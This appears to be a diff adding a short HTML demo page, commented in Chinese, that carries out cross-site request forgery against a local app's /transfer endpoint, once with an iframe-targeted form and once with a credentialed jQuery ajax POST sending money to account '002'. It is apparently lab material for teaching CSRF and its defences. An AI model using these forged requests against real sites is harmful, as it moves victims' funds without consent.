@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+<!-- 使用 form 实施 csrf 攻击 -->
+<form id="form1" action="http://localhost:8080/transfer" method="post" target="frame1">
+    目标账户：<input type="text" name="targetAccount" value="002">
+    金额：<input type="text" name="amount" value="20">
+    <input type="submit" value="使用 form 实施 csrf 攻击">
+</form>
+<br/>
+<iframe id="frame1" name="frame1" src="http://localhost:8080/" onload="this.width=screen.width;this.height=100;"></iframe>
+
+<!-- 使用 ajax 实施 csrf 攻击 -->
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+<hr/>
+<button id="ajax">使用 ajax 实施 csrf 攻击</button>
+<script>
+    $(document).ready(function () {
+        $("#ajax").click(function () {
+            $.ajax({
+                xhrFields: {withCredentials: true},
+                url: "http://localhost:8080/transfer",
+                type: 'post',
+                data: {targetAccount: "002", amount: 30},
+                success: function (data) {
+                    alert(JSON.stringify(data));
+                }
+            })
+        })
+    })
+</script>
+</body>
+</html>
